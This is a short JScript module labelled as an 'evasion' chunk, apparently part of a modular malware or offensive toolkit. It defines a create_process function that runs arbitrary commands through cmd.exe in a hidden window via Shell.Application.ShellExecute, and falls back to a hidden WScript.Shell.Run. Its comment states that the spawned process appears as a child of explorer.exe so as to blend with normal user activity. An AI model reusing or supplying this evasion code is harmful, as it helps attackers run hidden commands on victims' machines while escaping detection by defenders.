// chunk: evasion/process_shell_app
// depends: (none)
// provides: create_process
// format: jscript
// note: Creates processes via Shell.Application.ShellExecute. Process appears
//       as child of explorer.exe, blending with normal user activity.

function create_process(cmd) {
    try {
        var app = new ActiveXObject("Shell.Application");
        app.ShellExecute("cmd.exe", "/c " + cmd, "", "", 0);
    } catch(e) {
        var sh = new ActiveXObject("WScript.Shell");
        sh.Run(cmd, 0, false);
    }
}
